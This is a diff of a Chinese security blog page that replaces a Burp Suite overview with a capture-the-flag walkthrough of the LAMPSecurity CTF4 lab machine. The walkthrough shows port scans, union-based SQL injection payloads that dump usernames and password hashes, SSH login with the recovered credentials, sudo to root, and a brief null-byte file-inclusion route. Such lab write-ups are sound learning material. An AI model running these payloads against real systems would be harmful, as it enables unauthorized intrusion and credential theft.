@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>bp工具 |  小张之栈</title>
+      <title>LAMPSECURITY:CTF4 |  小张之栈</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/favicon.ico" />
@@ -64,7 +64,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-bp使用"
+  id="post-Lamp1"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -76,7 +76,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  bp工具
+  LAMPSECURITY:CTF4
 </h1>
  
 
@@ -84,11 +84,11 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2023/05/13/bp%E4%BD%BF%E7%94%A8/" class="article-date">
-  <time datetime="2023-05-13T02:11:37.000Z" itemprop="datePublished">2023-05-13</time>
+      <a href="/2023/09/16/Lamp1/" class="article-date">
+  <time datetime="2023-09-15T16:21:20.000Z" itemprop="datePublished">2023-09-16</time>
 </a> 
   <div class="article-category">
-    <a class="article-category-link" href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a>
+    <a class="article-category-link" href="/categories/vulhub/">vulhub</a>
   </div>
   
 <div class="word_count">
@@ -96,7 +96,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">2.1k</span>
+            <span class="post-count">817</span>
         </span>
     </span>
 
@@ -105,7 +105,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">7 分钟</span>
+            <span class="post-count">3 分钟</span>
         </span>
     </span>
 </div>
@@ -120,70 +120,81 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <p>抓包；爆破；repeat尝试；ssrf表单伪造；编码解码</p>
-<p>注意里面的空格用+或%20代替</p>
-<blockquote>
-<p>POST &#x2F;sqli&#x2F;9.php?a&#x3D;1236 HTTP&#x2F;1.1</p>
-</blockquote>
-<p>否则被认为是如HTTP&#x2F;1.1这种独立的数值</p>
-<p>为什么要配置代理啊：</p>
-<p>起拦截作用，作为一个在浏览器和目标应用程序之间的中间人，可以拦截、查看，修改在两个方向上的原始数据流哈</p>
-<h2 id="spider模块"><a href="#spider模块" class="headerlink" title="spider模块"></a>spider模块</h2><p>Spider的蜘蛛爬行功能可以帮助我们了解系统的结构，其中Spider爬取到的内容将在Target中展示，如图3-24所示，界面左侧为一个主机和目录树，选择具体某一个分支即可查看对应的请求与响应。</p>
-<h2 id="decode"><a href="#decode" class="headerlink" title="decode"></a>decode</h2><p>Burp中自带的编码解码及散列转换的工具，能对原始数据进行各种编码格式和散列的转换。</p>
-<h2 id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner"></a>Scanner</h2><p>用于自动检测Web系统的各种漏洞。</p>
-<p>分为主动扫描和被动扫描，可以在Target对分支操作，也可以去http history里</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620144628926.png"></p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620144833459.png"></p>
-<p>扫完后，可以右击Burp Target站点地图选项下的链接，依次选择“issues”→“Report issues”选项，然后导出漏洞报告</p>
-<h3 id="主动扫描"><a href="#主动扫描" class="headerlink" title="主动扫描"></a>主动扫描</h3><p>当使用主动扫描模式时，Burp会向应用发送新的请求并通过Payload验证漏洞。这种模式下的操作会产生大量的请求和应答数据，直接影响服务端的性能，通常用于非生产环境。主动扫描适用于以下这两类漏洞。</p>
-<p>● <strong>客户端的漏洞，如XSS、HTTP头注入、操作重定向。</strong></p>
-<p>● <strong>服务端的漏洞，如SQL注入、命令行注入、文件遍历。</strong></p>
-<p>对第一类漏洞，Burp在检测时会提交input域，然后根据应答的数据进行解析。在检测过程中，Burp会对基础的请求信息进行修改，即根据漏洞的特征对参数进行修改，模拟人的行为，以达到检测漏洞的目的；</p>
-<p>对第二类漏洞，以SQL注入为例，服务端有可能返回数据库错误提示信息，也有可能什么都不反馈。Burp在检测过程中会采用各个技术验证漏洞是否存在，例如诱导时间延迟、强制修改Boolean值、与模糊测试的结果进行比较，以提高漏洞扫描报告的准确性。</p>
-<h3 id="被动扫描"><a href="#被动扫描" class="headerlink" title="被动扫描"></a>被动扫描</h3><p>当使用被动扫描模式时，Burp不会重新发送新的请求，只是对已经存在的请求和应答进行分析，对服务端的检测来说，这比较安全，通常适用于生产环境的检测。一般来说，下列漏洞在被动模式中容易被检测出来。</p>
-<p>● 提交的密码为未加密的明文。</p>
-<p>● 不安全的cookie的属性，例如缺少HttpOnly和安全标志。</p>
-<p>● cookie的范围缺失。</p>
-<p>● 跨域脚本包含和站点引用泄露。</p>
-<p>● 表单值自动填充，尤其是密码。</p>
-<p>● SSL保护的内容缓存。</p>
-<p>● 目录列表。</p>
-<p>● 提交密码后应答延迟。</p>
-<p>● session令牌的不安全传输。</p>
-<p>● 敏感信息泄露，例如内部IP地址、电子邮件地址、堆栈跟踪等信息泄露。</p>
-<p>● 不安全的ViewState的配置。</p>
-<p>● 错误或不规范的Content-Type指令。</p>
-<p>这种扫描避免了平时测试破坏的可能。</p>
-<h2 id="Intruder"><a href="#Intruder" class="headerlink" title="Intruder"></a>Intruder</h2><p>可以对Web应用程序进行自动化攻击，如通过标识符枚举用户名、ID和账户号码，模糊测试，SQL注入，跨站，目录遍历等。</p>
-<p>工作原理是Intruder在原始请求数据的基础上，通过修改各种请求参数获取不同的请求应答。在每一次请求中，Intruder通常会携带一个或多个有效攻击载荷（Payload），在不同的位置进行攻击重放，通过应答数据的比对分析获得需要的特征数据。Burp Intruder通常被应用于以下场景。</p>
-<p>Intruder适用场景如：</p>
-<blockquote>
-<p>● 标识符枚举。Web应用程序经常使用标识符引用用户、账户、资产等数据信息。例如，用户名、文件ID和账户号码。</p>
-<p>● 提取有用的数据。在某些场景下，不是简单地识别有效标识符，而是通过简单标识符提取其他数据。例如，通过用户的个人空间ID获取所有用户在其个人空间的名字和年龄。</p>
-<p>● 模糊测试。很多输入型的漏洞（如SQL注入、跨站点脚本和文件路径遍历）可以通过请求参数提交各种测试字符串，并分析错误消息和其他异常情况，来对应用程序进行检测。受限于应用程序的大小和复杂性，手动执行这个测试是一个耗时且烦琐的过程，因此可以设置Payload，通过Burp Intruder自动化地对Web应用程序进行模糊测试。</p>
-</blockquote>
-<p>一般需要你有很好的字典，才可以有效地进行爆破、遍历。</p>
-<p>它有几个常见的模式</p>
-<blockquote>
-<p>● Sniper模式使用单一的Payload组。它会针对每个位置设置Payload。这种攻击类型适用于对常见漏洞中的<strong>请求参数单独进行Fuzzing测试</strong>的情景。攻击中的请求总数应该是position数量和Payload数量的乘积。</p>
-<p>● Battering ram模式使用单一的Payload组。它会重复Payload并一次性把所有相同的Payload放入指定的位置中。这种攻击适用于需要在请求中<strong>把相同的输入放到多个位置的情景</strong>。请求的总数是Payload组中Payload的总数。</p>
-<p>● Pitchfork模式使用多个Payload组。攻击会同步迭代所有的Payload组，把Payload放入每个定义的位置中。这种攻击类型非常适合<strong>在不同位置中需要插入不同但相似输入的情况</strong>。请求的数量应该是最小的Payload组中的Payload数量。</p>
-<p>● Cluster bomb模式会使用多个Payload组。每个定义的位置中有不同的Payload组。攻击会迭代每个Payload组，每种Payload组合都会被测试一遍。这种攻击适用于在位置中<strong>需要不同且不相关或者未知输入攻击的情景</strong>。攻击请求的总数是各Payload组中Payload数量的乘积。</p>
-</blockquote>
-<p>对Status或Length的返回值进行排序，有不同之处，则认为破解成功</p>
-<p>盲注一般也会依靠这个，但更多是用脚本。</p>
-<h2 id="Repeater"><a href="#Repeater" class="headerlink" title="Repeater"></a>Repeater</h2><p>手动修改、补发个别HTTP请求，并分析它们的响应的工具。它最大的用途就是能和其他Burp Suite工具结合起来使用。可以将目标站点地图、Burp Proxy浏览记录、Burp Intruder的攻击结果，发送到Repeater上，并手动调整这个请求来对漏洞的探测或攻击进行微调。</p>
-<p>bp有四种类型显示数据包</p>
-<p>● Raw主要显示Web请求的raw格式，以纯文本的形式显示数据包，包含请求地址、HTTP协议版本、主机头、浏览器信息、Accept可接受的内容类型、字符集、编码方式、cookie等，可以通过手动修改这些信息，对服务器端进行渗透测试。</p>
-<p>● Params主要显示客户端请求的参数信息，包括GET或者POST请求的参数、cookie参数。可以通过修改这些请求参数完成对服务器端的渗透测试。</p>
-<p>● Headers中显示的是数据包中的头信息，以名称、值的形式显示数据包。</p>
-<p>● Hex对应的是Raw中信息的二进制内容，可以通过Hex编辑器对请求的内容进行修改，在进行00截断时非常好用</p>
-<p>不想重复捕获，要反复测试时，可以将包放进repeater模块。</p>
-<h2 id="Comparer"><a href="#Comparer" class="headerlink" title="Comparer"></a>Comparer</h2><p>提供一个可视化的差异比对功能，来对比分析两次数据之间的区别</p>
-<h2 id="Sequencer"><a href="#Sequencer" class="headerlink" title="Sequencer"></a>Sequencer</h2><p>分析数据样本随机性质量的工具。可以用它测试应用程序的会话令牌（Session token）、密码重置令牌是否可预测等场景，通过Sequencer的数据样本分析，能很好地降低这些关键数据被伪造的风险。</p>
-<h2 id="手工导入插件"><a href="#手工导入插件" class="headerlink" title="手工导入插件"></a>手工导入插件</h2><p>命令行进入到插件文件夹所在位置</p>
-<p><img src="/../../../Typora/img111/image-20231116150707119.png"></p>
-<p>先下载插件去</p>
+  <h1 id="0x01信息收集"><a href="#0x01信息收集" class="headerlink" title="0x01信息收集"></a>0x01信息收集</h1><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>扫端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn --min-rate 10000 -p- 192.168.1.30 <span class="comment">#22,25(smtp),80</span></span><br><span class="line">sudo nmap -sT -sV -sC -O -p22,25,80 192.168.1.30</span><br><span class="line">nmap --script=vuln -p22,25,80 192.168.1.30</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../Typora/img111/image-20231126162243449.png" alt="详细信息"></p>
+<p><img src="/../../../Typora/img111/image-20231126162112885.png" alt="vuln检测，有sql注入，没截上，但不重要，自己去测"></p>
+<h2 id="2-SQL注入"><a href="#2-SQL注入" class="headerlink" title="2.SQL注入"></a>2.SQL注入</h2><p>访问80</p>
+<p><img src="/../../../Typora/img111/image-20231126162338206.png"></p>
+<p>Blog-&gt;read more</p>
+<p><img src="/../../../Typora/img111/image-20231126162357730.png" alt="注意链接"></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.1.30/index.html?page=blog&title=Blog&id=2">http://192.168.1.30/index.html?page=blog&amp;title=Blog&amp;id=2</a></p>
+<p><img src="/../../../Typora/img111/image-20231126162424573.png"></p>
+<p><del>数字型布尔注入，order by 没用</del></p>
+<p>对不起，我说话声音有点大，要加注释符</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span>=7 order by 5 -- -</span><br><span class="line"><span class="built_in">id</span>=-7 union <span class="keyword">select</span> 1,2,3,4,5--+</span><br><span class="line"><span class="built_in">id</span>=-7 union <span class="keyword">select</span> 1,database(),user(),4,5--+</span><br><span class="line"><span class="comment">#但是呢，database()报错，length(database())是回显了的</span></span><br></pre></td></tr></table></figure>
+
+<p>不慌，根据nmap扫出来的路径</p>
+<p><img src="/../../../Typora/img111/image-20231126200115032.png"></p>
+<p>数据库是ehks，表名为user，字段<strong>user_name 、user_pass</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span>=-7 union <span class="keyword">select</span> 1,(<span class="keyword">select</span> group_concat(<span class="string">&#x27;!&#x27;</span>,user_name,0x7e,user_pass) from ehks.user),3,4,5--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../Typora/img111/image-20231126200338107.png"></p>
+<p>6个用户</p>
+<p><img src="/../../../Typora/img111/image-20231126200658566.png"></p>
+<h2 id="3-略过不看，路线走歪了"><a href="#3-略过不看，路线走歪了" class="headerlink" title="3.略过不看，路线走歪了"></a>3.略过不看，路线走歪了</h2><p>去 <code>/admin</code>路径登录(也是nmap扫出来的)，第一个用户登录进来，只有发布功能，我把内容弄个xss的，发布后访问，可以弹窗，那我尝试一下，写php一句话，写个POST的</p>
+<p>不行诶</p>
+<p><img src="/../../../Typora/img111/image-20231126201517011.png"></p>
+<p>注释了</p>
+<p><img src="/../../../Typora/img111/image-20231126201919854.png"></p>
+<p>注释了，也对，后端语言在前端，执行不了</p>
+<p>访问conf路径</p>
+<p><img src="/../../../Typora/img111/image-20231126202125490.png"></p>
+<p>其中有一个dstevens</p>
+<p><img src="/../../../Typora/img111/image-20231126202251384.png"></p>
+<p>换路径 <code>/mail</code></p>
+<p><img src="/../../../Typora/img111/image-20231126203420059.png"></p>
+<p>我们dstevens进来了</p>
+<p><img src="/../../../Typora/img111/image-20231126203604406.png"></p>
+<p>哦，这些内容都是“我”进行攻击行为的记录，更早的有其它的作者信息，里面也提到了一个<code>/calendar</code>路径，难道我要发邮件拿shell吗</p>
+<p>换路径 <code>/restricted</code>，需要凭证</p>
+<p>用的是pmoore用户</p>
+<p><img src="/../../../Typora/img111/image-20231126204557935.png"></p>
+<p>没有有效信息</p>
+<p>嘶，那怎么拿shell</p>
+<p>dirb扫一波，也扫到了邮箱里看到的 <code>/calendar</code>路径</p>
+<p>访问后，登录，有一个添加事件</p>
+<p><img src="/../../../Typora/img111/image-20231126205444111.png"></p>
+<p>好像也写不了shell，算了</p>
+<p>啊！！！！！！！！！！！！！！！！！！！那咋搞！！！！！！！</p>
+<h2 id="4-ssh连接-sudo提权"><a href="#4-ssh连接-sudo提权" class="headerlink" title="4.ssh连接+sudo提权"></a>4.ssh连接+sudo提权</h2><p>看了wp，还是ssh，啧，我没有继续用kali的了，用了物理机的一个ssh工具，直接连接成功</p>
+<p>回到kali，根据ssh报错结果去百度</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -oHostKeyAlogrithms=+ssh-dss -oKexAlogrithms=+diffie-hellman-group-exchange-sha1 dstevens@192.168.1.30</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../Typora/img111/image-20231127122602101.png"></p>
+<p><img src="/../../../Typora/img111/image-20231127122700309.png" alt="测试启动，正常情况下无返回信息"></p>
+<p>emmm，好像和这些问题无关</p>
+<p><img src="/../../../Typora/img111/image-20231127125010233.png"></p>
+<p>这是因为登录一些老旧设备的缘故，<a target="_blank" rel="noopener" href="https://www.jiaozn.com/reed/838.html">解决参考</a></p>
+<p>之后随便一个<code>sudo /bin/bash</code> 或者 <code>sudo bash -p</code>，就拿到root了</p>
+<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>1.关于那个 database()、user()报错，其实还是要尝试回显位，比如第3个回显位是可以显示字符串的</p>
+<p><img src="/../../../Typora/img111/image-20231127130643691.png" alt="在位置3上就不会报错"></p>
+<h3 id="方法二：文件包含"><a href="#方法二：文件包含" class="headerlink" title="方法二：文件包含"></a>方法二：文件包含</h3><p>2.然后除了SQL注入，还有文件包含这种解法，猜测page参数可以文件包含，用 <code>%00截断</code>，直到获得敏感文件内容即可</p>
+<p><img src="/../../../Typora/img111/image-20231127131033301.png"></p>
+<p>其实插件暴露了php版本&lt;5.3.4，也是存在这种%00漏洞的</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
+<li>端口22,25,80</li>
+<li>访问80端口，发现了url上的id参数，考虑SQL注入</li>
+<li>手工或mysql拿到<strong>用户数据</strong></li>
+<li>ssh尝试登录进系统</li>
+<li>低权限用户又可以sudo -l，所以直接提权</li>
+</ol>
+<p>遇到报错问题，如ssh，一定要主动去搜索去解决！！！</p>
+<p>渗透测试，工具不重要，原理才重要，工具只是讲究效率</p>
+<p>因为对于工具来说，在实战中，工具特征码可能会被识别到</p>
+<p>还有之前做靶机的时候，目标机它没有nmap，那怎么扫端口；还要做个内网转发</p>
+<p>只会用脚本，那给你禁用了怎么办，会原理，就可以微改</p>
  
       <!-- reward -->
       
@@ -248,12 +259,12 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/05/13/bp%E4%BD%BF%E7%94%A8/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/09/16/Lamp1/" alt="微信分享二维码">
     </div>
 </div>
 
 <div id="share-mask"></div>  
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/bp%E5%B7%A5%E5%85%B7/" rel="tag">bp工具</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/vulhub/" rel="tag">vulhub</a></li></ul>
 
     </footer>
   </div>
@@ -261,19 +272,19 @@
    
   <nav class="article-nav">
     
-      <a href="/2023/05/13/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/" class="article-nav-link">
+      <a href="/2023/09/20/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/" class="article-nav-link">
         <strong class="article-nav-caption">上一篇</strong>
         <div class="article-nav-title">
           
-            渗透工具
+            日志分析
           
         </div>
       </a>
     
     
-      <a href="/2023/05/13/owasp-top10%E6%BC%8F%E6%B4%9E/" class="article-nav-link">
+      <a href="/2023/09/13/vulhub/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">owasp top10</div>
+        <div class="article-nav-title">vulnhub_new</div>
       </a>
     
   </nav>
